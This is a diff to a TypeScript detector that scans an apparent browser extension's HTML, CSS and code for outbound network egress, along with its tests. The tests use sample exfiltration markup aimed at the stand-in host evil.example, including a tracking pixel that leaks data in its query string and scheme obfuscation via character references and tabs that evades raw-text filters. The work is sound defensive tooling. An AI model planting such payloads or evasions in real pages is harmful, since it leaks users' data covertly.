@@ -22,6 +22,11 @@ const FORBIDDEN: ReadonlyArray<{ name: string; pattern: RegExp }> = [
   { name: 'fetch()', pattern: /\bfetch\s*\(/ },
   { name: 'XMLHttpRequest', pattern: /\bXMLHttpRequest\b/ },
   { name: 'sendBeacon()', pattern: /\bsendBeacon\s*\(/ },
+  // Outbound channels the extension-pages CSP does not reach: a content script runs in the
+  // host page's world, so `connect-src` in OUR manifest never applies to it. Neither name is
+  // used anywhere in src/, so the strict token match costs nothing.
+  { name: 'WebSocket', pattern: /\bWebSocket\b/ },
+  { name: 'EventSource', pattern: /\bEventSource\b/ },
 ];
 
 // Cover every JS/TS module flavor, not just .ts(x): a future non-TS file in a
@@ -168,9 +173,35 @@ function readSrcValue(attrs: string): string | null {
 // JS/TS half. That holds for a relative path inside the tree and for nothing else: an
 // absolute or protocol-relative URL fetches from another origin — the exact egress Golden
 // Principle #1 forbids — and a `..` segment escapes `src/` into files nothing reads.
+// Bring an attribute value to the form the browser actually resolves, before classifying it.
+// Testing the raw text is a false negative, measured both ways: the HTML parser decodes
+// character references first, so `&#x68;ttps://evil.example/x.png` is a real https fetch, and
+// the URL parser then strips ASCII tab/LF/CR from anywhere in the input, so `ht<TAB>tps://…`
+// is too. Neither carries a scheme the raw-text regex below can see.
+function normalizeUrlValue(rawValue: string): string {
+  return rawValue
+    .replace(/^["']|["']$/g, '')
+    .replace(/[\t\n\r]/g, '')
+    .replace(/&#(x[0-9a-f]+|\d+);?/gi, (_match, code: string) =>
+      String.fromCodePoint(
+        code[0].toLowerCase() === 'x' ? parseInt(code.slice(1), 16) : parseInt(code, 10),
+      ),
+    )
+    .trim();
+}
+
+// A `<script src=…>` is only benign because the module it loads is itself scanned by the
+// JS/TS half. That holds for a relative path inside the tree and for nothing else: an
+// absolute or protocol-relative URL fetches from another origin — the exact egress Golden
+// Principle #1 forbids — and a `..` segment escapes `src/` into files nothing reads.
 function isLocalInTreeSrc(rawValue: string): boolean {
-  const value = rawValue.replace(/^["']|["']$/g, '').trim();
+  const value = normalizeUrlValue(rawValue);
   if (value === '') return false;
+  // A NAMED character reference can hide a scheme too (`https&colon;//…`). Decoding the full
+  // named set is out of proportion for a tripwire, and no value under `src/` contains an `&`
+  // at all, so any survivor is rejected outright — over-reporting, the safe direction. A future
+  // query string needing `&amp;` argues its own allowance.
+  if (value.includes('&')) return false;
   if (/^[a-z][a-z0-9+.-]*:/i.test(value)) return false; // https:, data:, javascript:
   if (value.startsWith('//')) return false; // protocol-relative
   return !value.split(/[/\\]/).includes('..');
@@ -231,8 +262,9 @@ function findScriptViolations(rawHtml: string, label: string): string[] {
 // Chosen by FETCH SEMANTICS, not by "looks like a URL": each of these pulls bytes from the
 // value's origin with no user action, which is exactly the egress Golden Principle #1 forbids.
 // `src` covers img/iframe/audio/video/source/track/embed/input[type=image]; `data` is <object>;
-// `action`/`formaction` are submission targets a script can trigger.
-const URL_ATTRS = new Set(['src', 'srcset', 'poster', 'data', 'action', 'formaction']);
+// `action`/`formaction` are submission targets a script can trigger; `background` is the legacy
+// <body>/<table>/<tr>/<td> attribute Chrome still maps to background-image and still fetches.
+const URL_ATTRS = new Set(['src', 'srcset', 'poster', 'data', 'action', 'formaction', 'background']);
 
 // `href` is checked on these tags ONLY. On <link> it is an auto-fetched subresource; on <base>
 // it retargets every relative URL on the page, which would turn the local-path allowance below
@@ -243,9 +275,12 @@ const HREF_TAGS = new Set(['link', 'base']);
 // Split a `srcset` into its candidate URLs (the token before each descriptor). Commas inside a
 // URL would split wrongly, but every such URL carries a scheme (`data:`) and is rejected anyway,
 // and a spurious extra candidate only over-reports — the safe direction.
+function stripQuotes(rawValue: string): string {
+  return rawValue.replace(/^["']|["']$/g, '');
+}
+
 function splitSrcset(rawValue: string): string[] {
-  return rawValue
-    .replace(/^["']|["']$/g, '')
+  return stripQuotes(rawValue)
     .split(',')
     .map((candidate) => candidate.trim().split(/\s+/)[0])
     .filter((candidate) => candidate !== ''); // an empty candidate fetches nothing
@@ -269,20 +304,34 @@ function findSubresourceViolations(rawHtml: string, label: string): string[] {
     // badly is not one whose parse anybody should be leaning on, and over-reporting is the safe
     // direction. Note this is only the EOF case: a tag merely missing its own `>` absorbs the
     // following markup up to the next one, which readTagAttributes already reproduces.
-    const attrs = readTagAttributes(rawHtml, tagRe.lastIndex) ?? rawHtml.slice(tagRe.lastIndex);
-    for (const { name, value } of readAttributes(attrs)) {
+    const attrs = readTagAttributes(rawHtml, tagRe.lastIndex);
+    // Resume the tag scan AFTER this tag's `>`. Without that, the next iteration restarts inside
+    // the attribute text just read, so a tag-shaped string in a quoted VALUE
+    // (`<div data-html="<img src='https://…'>">`) re-matches as a real tag — a false positive; a
+    // real parser yields no such element (measured).
+    if (attrs !== null) tagRe.lastIndex += attrs.length + 1;
+    for (const { name, value } of readAttributes(attrs ?? rawHtml.slice(tagRe.lastIndex))) {
       const attr = name.toLowerCase();
-      // A valueless attribute (`<img src>`) parses to an EMPTY value, not to an absent one
-      // (measured). Empty resolves against the page's own URL, never off-origin, so it is not
-      // egress and is skipped — the one place this detector is narrower than the parser.
+      // Skipped here is the VALUELESS attribute (`<img src>`, no `=` at all), which fetches
+      // nothing. An explicit `src=""` is a different case and IS flagged: it resolves to the page
+      // itself rather than off-origin, so the report is an over-report — the safe direction.
       const fetches = URL_ATTRS.has(attr) || (attr === 'href' && HREF_TAGS.has(tag));
       if (!fetches || value === undefined) continue;
       const targets = attr === 'srcset' ? splitSrcset(value) : [value];
       for (const target of targets) {
         if (isLocalInTreeSrc(target)) continue;
-        violations.push(`${label}:${lineOf(m.index)} — remote or out-of-tree <${tag} ${attr}>`);
+        // Name the offending target: a srcset with two remote candidates would otherwise emit the
+        // same line twice, and the message would not say which URL to remove.
+        violations.push(
+          `${label}:${lineOf(m.index)} — remote or out-of-tree <${tag} ${attr}>: ${stripQuotes(target)}`,
+        );
       }
     }
+    // A tag left open at EOF IS dropped by a real parser (measured: happy-dom yields no element),
+    // so it fetches nothing — but its text is scanned anyway rather than skipped, because a file
+    // broken that badly is not one whose parse anybody should be leaning on. Nothing after it can
+    // be a tag, so stop here rather than re-matching inside it.
+    if (attrs === null) break;
   }
 
   // CSS `url()` — the options page is majority inline `<style>`, and a `background: url(https://…)`
@@ -292,16 +341,18 @@ function findSubresourceViolations(rawHtml: string, label: string): string[] {
   let u: RegExpExecArray | null;
   while ((u = cssUrlRe.exec(rawHtml)) !== null) {
     if (isLocalInTreeSrc(u[1])) continue;
-    violations.push(`${label}:${lineOf(u.index)} — remote or out-of-tree CSS url()`);
+    violations.push(`${label}:${lineOf(u.index)} — remote or out-of-tree CSS url(): ${stripQuotes(u[1])}`);
   }
 
   // `@import` takes a bare string as well as a url(), and the bare form is the one the scan above
-  // misses. It fetches a whole remote stylesheet, which can then pull further subresources.
-  const cssImportRe = /@import\s+("[^"]*"|'[^']*')/gi;
+  // misses. It fetches a whole remote stylesheet, which can then pull further subresources. The
+  // separator is `\s*`, not `\s+`: CSS tokenizes `@import"https://…"` as an at-keyword followed by
+  // a string with no whitespace required, and that shape passed while the spaced one was caught.
+  const cssImportRe = /@import\s*("[^"]*"|'[^']*')/gi;
   let i: RegExpExecArray | null;
   while ((i = cssImportRe.exec(rawHtml)) !== null) {
     if (isLocalInTreeSrc(i[1])) continue;
-    violations.push(`${label}:${lineOf(i.index)} — remote or out-of-tree CSS @import`);
+    violations.push(`${label}:${lineOf(i.index)} — remote or out-of-tree CSS @import: ${stripQuotes(i[1])}`);
   }
 
   return violations;
@@ -505,37 +556,37 @@ describe('privacy gate detector: remote subresources in HTML', () => {
     // The exact markup verified green against the `<script>`-only gate when this residual was
     // raised. It is a working exfiltration channel: the query string carries whatever the page read.
     expect(findSubresourceViolations('<img src="https://evil.example/p.gif?d=leak">', 'h')).toEqual([
-      'h:1 — remote or out-of-tree <img src>',
+      'h:1 — remote or out-of-tree <img src>: https://evil.example/p.gif?d=leak',
     ]);
   });
 
   it('flags a protocol-relative iframe', () => {
     expect(findSubresourceViolations('<iframe src="//evil.example/x"></iframe>', 'h')).toEqual([
-      'h:1 — remote or out-of-tree <iframe src>',
+      'h:1 — remote or out-of-tree <iframe src>: //evil.example/x',
     ]);
   });
 
   it('flags a remote form target on either attribute', () => {
     expect(findSubresourceViolations('<form action="https://evil.example/c"></form>', 'h')).toEqual([
-      'h:1 — remote or out-of-tree <form action>',
+      'h:1 — remote or out-of-tree <form action>: https://evil.example/c',
     ]);
     expect(
       findSubresourceViolations('<button formaction="https://evil.example/c">go</button>', 'h'),
-    ).toEqual(['h:1 — remote or out-of-tree <button formaction>']);
+    ).toEqual(['h:1 — remote or out-of-tree <button formaction>: https://evil.example/c']);
   });
 
   it('flags a remote candidate inside an otherwise local srcset', () => {
     expect(
       findSubresourceViolations('<img srcset="./b.png 2x, https://evil.example/a.png 1x">', 'h'),
-    ).toEqual(['h:1 — remote or out-of-tree <img srcset>']);
+    ).toEqual(['h:1 — remote or out-of-tree <img srcset>: https://evil.example/a.png']);
   });
 
   it('flags a remote object data and video poster', () => {
     expect(findSubresourceViolations('<object data="https://evil.example/x"></object>', 'h')).toEqual([
-      'h:1 — remote or out-of-tree <object data>',
+      'h:1 — remote or out-of-tree <object data>: https://evil.example/x',
     ]);
     expect(findSubresourceViolations('<video poster="https://evil.example/p.jpg"></video>', 'h')).toEqual(
-      ['h:1 — remote or out-of-tree <video poster>'],
+      ['h:1 — remote or out-of-tree <video poster>: https://evil.example/p.jpg'],
     );
   });
 
@@ -545,10 +596,10 @@ describe('privacy gate detector: remote subresources in HTML', () => {
     // page is legitimate and must not turn this red.
     expect(findSubresourceViolations('<link rel="stylesheet" href="./style.css">', 'h')).toEqual([]);
     expect(findSubresourceViolations('<link rel="stylesheet" href="https://cdn.example/x.css">', 'h')).toEqual(
-      ['h:1 — remote or out-of-tree <link href>'],
+      ['h:1 — remote or out-of-tree <link href>: https://cdn.example/x.css'],
     );
     expect(findSubresourceViolations('<base href="https://evil.example/">', 'h')).toEqual([
-      'h:1 — remote or out-of-tree <base href>',
+      'h:1 — remote or out-of-tree <base href>: https://evil.example/',
     ]);
     expect(findSubresourceViolations('<a href="https://chatgpt.com">docs</a>', 'h')).toEqual([]);
   });
@@ -558,23 +609,28 @@ describe('privacy gate detector: remote subresources in HTML', () => {
     // allowing the scheme here would also admit `data:text/html`. A future inline asset argues its
     // own allowance rather than inheriting one nobody reviewed.
     expect(findSubresourceViolations('<img src="data:image/png;base64,iVBOR">', 'h')).toEqual([
-      'h:1 — remote or out-of-tree <img src>',
+      'h:1 — remote or out-of-tree <img src>: data:image/png;base64,iVBOR',
     ]);
   });
 
   it('flags a remote CSS url() in an inline style block', () => {
     const html = '<style>\nbody { background: url(https://evil.example/bg.png); }\n</style>';
-    expect(findSubresourceViolations(html, 'h')).toEqual(['h:2 — remote or out-of-tree CSS url()']);
+    expect(findSubresourceViolations(html, 'h')).toEqual(['h:2 — remote or out-of-tree CSS url(): https://evil.example/bg.png']);
   });
 
   it('flags a remote CSS @import in either form', () => {
     // `@import` accepts a bare string, which the url() scan does not see. It pulls a whole remote
     // stylesheet, which can then pull further subresources of its own.
     expect(findSubresourceViolations('<style>@import "https://evil.example/x.css";</style>', 'h')).toEqual([
-      'h:1 — remote or out-of-tree CSS @import',
+      'h:1 — remote or out-of-tree CSS @import: https://evil.example/x.css',
     ]);
     expect(findSubresourceViolations("<style>@import url('https://evil.example/x.css');</style>", 'h')).toEqual([
-      'h:1 — remote or out-of-tree CSS url()',
+      'h:1 — remote or out-of-tree CSS url(): https://evil.example/x.css',
+    ]);
+    // CSS needs no whitespace between the at-keyword and the string, and this shape passed while
+    // the spaced one was caught.
+    expect(findSubresourceViolations('<style>@import"https://evil.example/x.css";</style>', 'h')).toEqual([
+      'h:1 — remote or out-of-tree CSS @import: https://evil.example/x.css',
     ]);
     expect(findSubresourceViolations('<style>@import "./theme.css";</style>', 'h')).toEqual([]);
   });
@@ -600,7 +656,57 @@ describe('privacy gate detector: remote subresources in HTML', () => {
 
   it('flags an out-of-tree relative path', () => {
     expect(findSubresourceViolations('<img src="../../node_modules/foo/x.png">', 'h')).toEqual([
-      'h:1 — remote or out-of-tree <img src>',
+      'h:1 — remote or out-of-tree <img src>: ../../node_modules/foo/x.png',
+    ]);
+  });
+
+  it('sees through a scheme hidden by URL/HTML normalization', () => {
+    // Both forms resolve to https://evil.example/… in a real browser and both passed a raw-text
+    // scheme test. The URL parser strips ASCII tab/LF/CR anywhere in the input; the HTML parser
+    // decodes character references before it ever gets there.
+    expect(findSubresourceViolations('<img src="ht\ttps://evil.example/tab.png">', 'h')).toEqual([
+      'h:1 — remote or out-of-tree <img src>: ht\ttps://evil.example/tab.png',
+    ]);
+    expect(findSubresourceViolations('<img src="&#x68;ttps://evil.example/hex.png">', 'h')).toEqual([
+      'h:1 — remote or out-of-tree <img src>: &#x68;ttps://evil.example/hex.png',
+    ]);
+    expect(findSubresourceViolations('<img src="&#104;ttps://evil.example/dec.png">', 'h')).toEqual([
+      'h:1 — remote or out-of-tree <img src>: &#104;ttps://evil.example/dec.png',
+    ]);
+    // A named reference can hide a scheme too; any surviving `&` is rejected rather than decoded.
+    expect(findSubresourceViolations('<img src="https&colon;//evil.example/named.png">', 'h')).toEqual([
+      'h:1 — remote or out-of-tree <img src>: https&colon;//evil.example/named.png',
+    ]);
+  });
+
+  it('flags the legacy background attribute', () => {
+    // Chrome still maps `background` on <body>/<table>/<tr>/<td> to background-image and fetches it.
+    expect(findSubresourceViolations('<body background="https://evil.example/bg.png">', 'h')).toEqual([
+      'h:1 — remote or out-of-tree <body background>: https://evil.example/bg.png',
+    ]);
+  });
+
+  it('does not treat a tag-shaped attribute VALUE as a tag', () => {
+    // A real parser yields no <img> here (measured) — the string is just the div's attribute value.
+    // The tag scan must resume after the div's own `>`, or it re-matches inside what it just read.
+    expect(
+      findSubresourceViolations(`<div data-html="<img src='https://evil.example/x.png'>"></div>`, 'h'),
+    ).toEqual([]);
+  });
+
+  it('flags src="" even though it resolves same-origin', () => {
+    // Over-report, stated so the behaviour is not mistaken for the valueless-attribute skip above.
+    expect(findSubresourceViolations('<img src="">', 'h')).toEqual([
+      'h:1 — remote or out-of-tree <img src>: ',
+    ]);
+  });
+
+  it('names each offending target separately in a multi-candidate srcset', () => {
+    expect(
+      findSubresourceViolations('<img srcset="https://a.example/1.png 1x, https://b.example/2.png 2x">', 'h'),
+    ).toEqual([
+      'h:1 — remote or out-of-tree <img srcset>: https://a.example/1.png',
+      'h:1 — remote or out-of-tree <img srcset>: https://b.example/2.png',
     ]);
   });
 
@@ -614,27 +720,27 @@ describe('privacy gate detector: remote subresources in HTML', () => {
     // A quote in NAME position does not open a value: the parser closes tag 1 at the first `>`,
     // leaving it srcless, and the remote src belongs to tag 2.
     expect(findSubresourceViolations('<img x"><img src="https://evil.example/y.png">', 'h')).toEqual([
-      'h:1 — remote or out-of-tree <img src>',
+      'h:1 — remote or out-of-tree <img src>: https://evil.example/y.png',
     ]);
     // A quote inside an UNQUOTED value is a literal; the value ends at the whitespace.
     expect(findSubresourceViolations('<img data-x=a"b src="https://evil.example/z.png">', 'h')).toEqual([
-      'h:1 — remote or out-of-tree <img src>',
+      'h:1 — remote or out-of-tree <img src>: https://evil.example/z.png',
     ]);
     // Attribute and tag names are case-insensitive to the parser, so they must be here too.
     expect(findSubresourceViolations('<IMG SRC="https://evil.example/upper.png">', 'h')).toEqual([
-      'h:1 — remote or out-of-tree <img src>',
+      'h:1 — remote or out-of-tree <img src>: https://evil.example/upper.png',
     ]);
     // Left open at EOF the parser drops the tag, so nothing fetches — flagged anyway, on purpose.
     expect(findSubresourceViolations('<img src="https://evil.example/eof.png"', 'h')).toEqual([
-      'h:1 — remote or out-of-tree <img src>',
+      'h:1 — remote or out-of-tree <img src>: https://evil.example/eof.png',
     ]);
   });
 
   it('reports every offending tag in a file, with its line', () => {
     const html = '<img src="https://a.example/1.png">\n<img src="./ok.png">\n<iframe src="https://b.example/"></iframe>';
     expect(findSubresourceViolations(html, 'h')).toEqual([
-      'h:1 — remote or out-of-tree <img src>',
-      'h:3 — remote or out-of-tree <iframe src>',
+      'h:1 — remote or out-of-tree <img src>: https://a.example/1.png',
+      'h:3 — remote or out-of-tree <iframe src>: https://b.example/',
     ]);
   });
 });
